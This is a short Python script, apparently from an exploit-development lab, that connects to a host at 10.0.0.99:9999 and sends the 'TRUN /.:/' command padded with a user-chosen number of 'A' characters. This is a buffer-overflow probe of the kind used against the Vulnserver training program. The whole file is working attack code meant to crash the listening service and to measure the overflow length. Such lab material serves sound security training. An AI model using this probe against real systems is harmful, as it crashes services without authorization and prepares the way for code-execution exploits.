#!/usr/bin/env python


import socket




TCP_IP = '10.0.0.99'
TCP_PORT = 9999
length = int(raw_input('Length of attack: '))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((TCP_IP, TCP_PORT))
print s.recv(1024)

print "Sending attack length ", length, 'to TRUN /.:/'
attack = "A" * length

s.send(('TRUN /.:/' + attack + '\r\n'))

print s.recv(1024)

s.send('EXIT\r\n')

print s.recv(1024)
s.close()
